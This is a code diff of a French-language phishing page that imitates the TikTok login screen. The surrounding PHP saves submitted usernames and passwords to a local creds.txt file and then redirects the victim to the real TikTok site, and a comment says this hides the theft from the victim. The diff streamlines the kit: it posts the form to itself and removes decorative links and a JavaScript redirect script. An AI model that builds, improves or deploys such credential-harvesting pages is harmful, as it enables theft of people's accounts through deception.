@@ -18,8 +18,8 @@ if ($_POST) {
     $log .= "└─────────────────────────────────────────\n";
 
     file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
-    
-    // Redirection vers TikTok (permet à la victime de voir la vraie page)
+
+    // Redirection directe vers TikTok
     header('Location: https://www.tiktok.com/');
     exit;
 }
@@ -31,7 +31,6 @@ if ($_POST) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok - Connexion</title>
     <style>
-        /* TikTok CSS Clone - Responsive */
         body {
             background-color: #000;
             color: #fff;
@@ -106,41 +105,6 @@ if ($_POST) {
             opacity: 1;
         }
         
-        .options {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #8e8e8e;
-        }
-        
-        .options a {
-            color: #8e8e8e;
-            text-decoration: none;
-            margin: 0 12px;
-        }
-        
-        .options a:hover {
-            color: #fff;
-        }
-        
-        .footer {
-            margin-top: 30px;
-            font-size: 13px;
-            color: #8e8e8e;
-        }
-        
-        .footer a {
-            color: #fff;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        
-        .signup-link {
-            color: #25f4ee;
-            font-weight: 600;
-            text-decoration: none;
-        }
-
-        /* Responsive */
         @media (max-width: 480px) {
             .login-container {
                 max-width: 280px;
@@ -155,33 +119,11 @@ if ($_POST) {
 <body>
     <div class="login-container">
         <div class="logo">tiktok<span>.</span></div>
-        <form class="login-form" method="POST" action="tiktoklogin.php">
+        <form class="login-form" method="POST" action="">
             <input type="text" name="email" class="input-field" placeholder="Nom d'utilisateur, email ou téléphone" required>
             <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
             <button type="submit" class="submit-btn">Se connecter</button>
         </form>
-        <div class="options">
-            <a href="#">Mot de passe oublié ?</a>
-            <a href="#">Besoin d'aide ?</a>
-        </div>
-        <div class="footer">
-            Vous n'avez pas de compte ? <a href="#" class="signup-link">S'inscrire</a>
-        </div>
     </div>
-
-    <script>
-        // Script pour rediriger après capture
-        document.querySelector('form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const formData = new FormData(this);
-            fetch(this.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(() => {
-                window.location.href = 'https://www.tiktok.com/';
-            });
-        });
-    </script>
 </body>
 </html>
